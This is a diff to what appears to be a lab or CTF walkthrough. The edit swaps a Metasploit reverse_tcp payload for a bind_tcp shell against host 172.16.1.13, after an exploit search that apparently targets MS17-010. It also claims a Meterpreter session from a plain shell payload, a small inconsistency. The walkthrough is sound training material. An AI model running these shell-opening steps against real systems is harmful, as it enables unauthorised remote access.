@@ -403,9 +403,15 @@ Startup msfconsole and search for a sutable exploit.
 
       set RHOSTS 172.16.1.13
 
-If we run this, we'll see that the standard payload dosent get us a shell, perhaps the firewall is blocking outgoing connections. So lets try a different payload and see what happens:
+If we run this, we'll see that the standard payload (windows/meterpreter/reverse_tcp) dosent get us a shell, perhaps their firewall is blocking outgoing connections.
 
-      set PAYLOAD windows/smb/ms17_010_psexec
+- Lets see if a bind shell will work. We can find several different possible payloads with:
+
+      grep bind show payloads
+
+and see what happens:
+
+      set PAYLOAD payload/windows/x64/shell/bind_tcp
 
 After running the script we can see that we've got a Meterpreter session! Lets drop into a cmd.exe shell:
 
